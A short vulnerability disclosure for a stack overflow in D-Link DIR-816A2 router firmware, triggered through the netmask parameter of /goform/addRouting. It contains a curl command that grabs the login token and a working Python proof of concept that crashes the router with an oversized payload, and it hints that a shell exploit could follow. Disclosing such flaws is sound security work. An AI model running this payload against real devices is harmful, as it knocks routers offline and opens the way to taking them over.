# DIR-816A2_FWv1.10CNB05_R1B011D88210.img Stack overflow vulnerability

## Overview

- Manufacturer's address：http://www.dlink.com.cn/
- Firmware download address ： http://www.dlink.com.cn/techsupport/ProductInfo.aspx?m=DIR-816

## Affected version

Below is the latest firmware

![](img/1.png#center)

## Vulnerability details

Vulnerability occurs in /goform/addRouting.  The content obtained by netmask parameter is passed to V3, and then the content matched by V3 is write into the V13 stack without size checking, resulting in a stack overflow.

![](img/2.png#center)


## Vulnerability verify

![](img/3.png#center)

![](img/4.png#center)

## POC

Gets the token ID

```
curl http://192.168.0.1/dir_login.asp | grep tokenid
```

Run poc

```python
import requests


tokenid = ''

url = 'http://192.168.0.1/goform/addRouting'

payload = b'a' * 10000

data = {
    'tokenid': tokenid,
    'dest': '1.1.1.1',
    'netmask': payload
}

print('payload sending...')
r = requests.post(url, data)
print('end')
```

You can see the router crash, and finally you can write an exp to get a shell